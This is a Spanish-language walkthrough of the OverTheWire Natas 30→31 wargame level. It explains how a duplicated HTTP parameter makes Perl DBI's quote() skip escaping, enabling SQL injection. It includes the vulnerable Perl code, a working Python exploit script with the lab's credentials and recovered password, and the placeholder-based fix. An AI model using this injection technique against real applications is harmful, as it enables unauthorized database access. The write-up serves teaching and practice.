# Natas 30 → 31

## Información del nivel

| Campo | Valor |
|---|---|
| URL | http://natas30.natas.labs.overthewire.org |
| Usuario | natas30 |
| Contraseña | WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH |
| Contraseña obtenida | m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y |

---

## Reconocimiento

La página presenta un formulario de login con username y password. El backend está escrito en **Perl**, no PHP — usa `DBI` para conectarse a una base de datos MySQL.

---

## Análisis del código fuente

```perl
if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password'));

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
}
```

### Línea por línea

```perl
my $dbh = DBI->connect(...)
```
Conecta a la base de datos MySQL.

```perl
my $query = "Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password'));
```
Construye la query SQL concatenando el username y password escapados con `$dbh->quote()`. En teoría, `quote()` previene SQL injection escapando caracteres especiales y agregando comillas alrededor del valor.

```perl
my $sth = $dbh->prepare($query);
$sth->execute();
my $ver = $sth->fetch();
```
Prepara, ejecuta la query y obtiene el primer registro.

```perl
if ($ver){
    print "win!<br>";
    print @$ver;
}
```
Si hay un registro, imprime "win!" y el contenido — incluyendo la contraseña.

---

## Vulnerabilidad: Perl DBI quote() Array Injection

### El comportamiento normal de `quote()`

```perl
$dbh->quote("texto")           # devuelve 'texto'  ← string escapado con comillas
$dbh->quote("'evil' OR 1=1")   # devuelve '\\'evil\\' OR 1=1'  ← escapa las comillas
```

`quote()` está diseñado para prevenir SQL injection.

### El bug de los argumentos múltiples

`quote()` acepta un **segundo argumento** que indica el tipo SQL del valor:

```perl
$dbh->quote($value, $data_type)
```

Si `$data_type` es un tipo numérico como `SQL_INTEGER` (4), `SQL_NUMERIC` (2), `SQL_FLOAT` (3), etc., `quote()` **no escapa el valor** y **no agrega comillas** — lo trata como un número.

### Cómo se explota con `param()`

En Perl, si un parámetro HTTP aparece **dos veces** en el request, `param('nombre')` devuelve un **array** en contexto de lista. Cuando ese array se pasa a `quote()`, los elementos se interpretan como múltiples argumentos:

```perl
# Si el request es: password='a' or 1&password=2
$dbh->quote(param('password'))  
# se evalúa como:
$dbh->quote("'a' or 1", 2)
```

El segundo argumento (`2`) le dice a `quote()` que el valor es numérico → no escapa nada → el `'a' or 1` llega al SQL sin escape.

---

## Camino del payload

**Tu request:**
```
username=natas31
password='a' or 1
password=2
```

**Construcción de la query:**
```perl
$dbh->quote("natas31")           # → 'natas31'  (escapado normal)
$dbh->quote("'a' or 1", 2)       # → 'a' or 1   (sin escapar, sin comillas)
```

**Query SQL resultante:**
```sql
SELECT * FROM users WHERE username = 'natas31' AND password = 'a' OR 1
```

**Por qué funciona:**
- `password = 'a'` es falso (no coincide con la contraseña real)
- `OR 1` siempre es verdadero
- La query devuelve el primer registro de `users` → contiene la contraseña de natas31

---

## Explotación

```python
import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas30.natas.labs.overthewire.org/index.pl'
auth = HTTPBasicAuth('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')

payload = {"username": "natas31", "password": ["'a' or 1", 2]}

r = requests.post(url, auth=auth, data=payload)
print(r.text)
```

El diccionario de Python con lista como valor envía el parámetro `password` dos veces — exactamente lo que necesitamos para activar el bug.

---

## ¿Por qué `prepare()` no fue suficiente?

`prepare()` es seguro **solo si se usan placeholders**:

```perl
# Forma correcta (segura)
my $query = "SELECT * FROM users WHERE username = ? AND password = ?";
my $sth = $dbh->prepare($query);
$sth->execute(param('username'), param('password'));
```

Con placeholders, los valores nunca se concatenan al string SQL — la base de datos los maneja por separado y no hay forma de inyectar SQL.

El código de natas30 usa `prepare()` pero **concatena los valores escapados con `quote()` al string** — eso reintroduce el riesgo.

---

## Conceptos clave

- **Perl DBI `quote()`**: función para escapar valores antes de incluirlos en queries SQL. Vulnerable cuando recibe múltiples argumentos.
- **`param()` con duplicados**: en Perl CGI, parámetros HTTP duplicados se devuelven como array en contexto de lista.
- **Tipos SQL**: constantes numéricas que indican el tipo de dato. `SQL_NUMERIC=2`, `SQL_INTEGER=4`. Cuando `quote()` recibe estos tipos, no escapa el valor.
- **Placeholders SQL (`?`)**: la forma segura de pasar valores a queries. El driver de la BD los maneja sin concatenación de strings.
- **Mass parameter assignment**: cuando un framework permite que el atacante controle no solo el valor sino también la estructura de los parámetros (cantidad, tipo).
